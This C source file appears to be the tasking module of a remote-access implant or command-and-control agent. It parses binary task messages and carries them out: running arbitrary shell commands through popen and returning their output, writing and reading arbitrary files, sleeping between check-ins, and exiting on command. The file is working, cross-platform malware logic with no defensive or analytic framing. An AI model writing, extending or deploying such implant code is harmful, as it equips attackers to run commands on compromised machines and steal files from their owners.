#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
    #include <windows.h>
    #define popen  _popen
    #define pclose _pclose
#else
    #include <unistd.h>
#endif

#define TASK_SHELL    0
#define TASK_UPLOAD   1
#define TASK_DOWNLOAD 2
#define TASK_SLEEP    3
#define TASK_KILL     4

struct Task {
    uint8_t type;
    uint32_t data_len;
    uint8_t *data;
};

struct Task* parse_task(uint8_t *data, size_t len) {
    if (!data || len < 5) return NULL;

    uint32_t data_len = ((uint32_t)data[1] << 24) |
                        ((uint32_t)data[2] << 16) |
                        ((uint32_t)data[3] << 8)  |
                        ((uint32_t)data[4]);

    if (len < 5 + (size_t)data_len) return NULL;

    struct Task *t = (struct Task*)malloc(sizeof(struct Task));
    if (!t) return NULL;

    t->type = data[0];
    t->data_len = data_len;

    if (data_len > 0) {
        t->data = (uint8_t*)malloc(data_len);
        if (!t->data) {
            free(t);
            return NULL;
        }
        memcpy(t->data, data + 5, data_len);
    } else {
        t->data = NULL;
    }

    return t;
}

size_t execute_task(struct Task *t, uint8_t *out, size_t out_len) {
    if (!t || !out || out_len == 0) return 0;

    switch (t->type) {
        case TASK_SHELL: {
            if (!t->data || t->data_len == 0) return 0;
            char *cmd = (char*)malloc(t->data_len + 1);
            if (!cmd) return 0;
            memcpy(cmd, t->data, t->data_len);
            cmd[t->data_len] = '\0';

            FILE *fp = popen(cmd, "r");
            free(cmd);
            if (!fp) return 0;

            size_t n = fread(out, 1, out_len, fp);
            pclose(fp);
            return n;
        }
        case TASK_UPLOAD: {
            if (!t->data || t->data_len == 0) return 0;
            char *nul = (char*)memchr(t->data, 0, t->data_len);
            if (!nul) return 0; // Missing null terminator for filename

            char *filename = (char*)t->data;
            size_t fname_len = (size_t)(nul - (char*)t->data);
            size_t filedata_offset = fname_len + 1;
            if (filedata_offset > t->data_len) return 0;

            uint8_t *filedata = t->data + filedata_offset;
            size_t filedata_len = t->data_len - filedata_offset;

            FILE *f = fopen(filename, "wb");
            if (!f) return 0;
            fwrite(filedata, 1, filedata_len, f);
            fclose(f);

            if (out_len >= 2) {
                memcpy(out, "ok", 2);
                return 2;
            }
            return 0;
        }
        case TASK_DOWNLOAD: {
            if (!t->data || t->data_len == 0) return 0;
            char *filename = (char*)malloc(t->data_len + 1);
            if (!filename) return 0;
            memcpy(filename, t->data, t->data_len);
            filename[t->data_len] = '\0';

            FILE *f = fopen(filename, "rb");
            free(filename);
            if (!f) return 0;

            size_t n = fread(out, 1, out_len, f);
            fclose(f);
            return n;
        }
        case TASK_SLEEP: {
            if (!t->data || t->data_len < 4) return 0;
            uint32_t interval = ((uint32_t)t->data[0] << 24) |
                                ((uint32_t)t->data[1] << 16) |
                                ((uint32_t)t->data[2] << 8)  |
                                ((uint32_t)t->data[3]);
#ifdef _WIN32
            Sleep(interval * 1000);
#else
            sleep(interval);
#endif
            if (out_len >= 2) {
                memcpy(out, "ok", 2);
                return 2;
            }
            return 0;
        }
        case TASK_KILL: {
            exit(0);
        }
        default:
            return 0;
    }
}
